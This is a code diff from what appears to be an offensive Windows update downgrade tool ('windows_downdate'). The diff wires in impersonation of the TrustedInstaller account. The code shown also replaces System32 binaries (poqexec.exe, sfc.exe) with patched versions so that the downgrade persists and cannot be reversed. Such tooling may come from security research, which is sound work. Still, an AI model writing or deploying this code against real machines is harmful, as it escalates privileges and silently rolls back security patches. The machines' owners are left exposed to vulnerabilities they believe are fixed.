@@ -7,6 +7,7 @@ from typing import List
 from windows_downdate import UpdateFile
 from windows_downdate.component_store_utils import retrieve_oldest_files_for_update_files
 from windows_downdate.filesystem_utils import is_path_exists, Path, is_file_contents_equal
+from windows_downdate.privilege_utils import impersonate_trusted_installer
 from windows_downdate.system_utils import restart_system
 from windows_downdate.update_utils import pend_update, get_empty_pending_xml
 from windows_downdate.xml_utils import load_xml, find_child_elements_by_match, get_element_attribute, create_element, \
@@ -99,11 +100,9 @@ def main() -> None:
     init_logger()
     args = parse_args()
 
-    # Elevate to TrustedInstaller
     if args.elevate:
-        raise NotImplementedError("Not implemented yet")
+        impersonate_trusted_installer()
 
-    # Install all missing Windows Updates to make the system "Up to date"
     if args.invisible:
         raise NotImplementedError("Not implemented yet")
 
@@ -112,14 +111,12 @@ def main() -> None:
 
     update_files = parse_config_xml(args.config_xml)
 
-    # Add poqexec.exe patch to downgrade XML and block servicing stack updates
     if args.persistent:
         patched_poqexec_path_obj = Path(f"{cwd}\\resources\\PoqExec\\poqexec.exe")
         poqexec_path_obj = Path("C:\\Windows\\System32\\poqexec.exe")
         poqexec_update_file_obj = UpdateFile(patched_poqexec_path_obj, poqexec_path_obj)
         update_files.append(poqexec_update_file_obj)
 
-    # Add SFC.exe patch to downgrade XML
     if args.irreversible:
         patched_sfc_path_obj = Path(f"{cwd}\\resources\\SFC\\sfc.exe")
         sfc_path_obj = Path("C:\\Windows\\System32\\sfc.exe")
